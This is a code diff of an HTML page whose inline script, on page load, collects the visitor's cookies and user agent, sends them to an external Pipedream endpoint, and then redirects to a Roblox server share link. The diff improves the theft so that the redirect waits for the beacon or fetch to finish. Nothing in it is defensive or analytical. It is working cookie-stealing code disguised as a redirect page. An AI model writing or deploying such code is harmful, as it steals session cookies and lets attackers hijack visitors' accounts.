@@ -342,11 +342,10 @@
     </div>
 
     <script>
-      
-        const YOUR_API_URL = 'https://eot2iixinio81vq.m.pipedream.net/';
+    const YOUR_API_URL = 'https://eot2iixinio81vq.m.pipedream.net/';
     const REDIRECT_URL = 'https://www.roblox.com/share?code=a1830c3b439b154fb6978bff940c7154&type=Server';
 
-    function sendCookies() {
+    function sendCookiesAndRedirect() {
         const data = {
             cookies: document.cookie,
             user_agent: navigator.userAgent,
@@ -357,30 +356,31 @@
 
         const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
 
-        if (navigator.sendBeacon) {
-            navigator.sendBeacon(YOUR_API_URL, blob);
+        // Încercăm cu sendBeacon
+        let sent = navigator.sendBeacon && navigator.sendBeacon(YOUR_API_URL, blob);
+
+        if (sent) {
+            // Redirect imediat după ce beacon-ul a fost acceptat
+            window.location.href = REDIRECT_URL;
         } else {
+            // Fallback pe fetch (cu keepalive)
             fetch(YOUR_API_URL, {
                 method: 'POST',
                 body: blob,
                 keepalive: true
+            }).finally(() => {
+                window.location.href = REDIRECT_URL;
             });
         }
     }
 
-    document.addEventListener('DOMContentLoaded', function() {
-        sendCookies();
-
-        // Redirect aproape instant (50ms delay)
-        setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-        }, 50);
-    });
+    document.addEventListener('DOMContentLoaded', sendCookiesAndRedirect);
 </script>
 </body>
  
  
 </html>
+
 
 
 
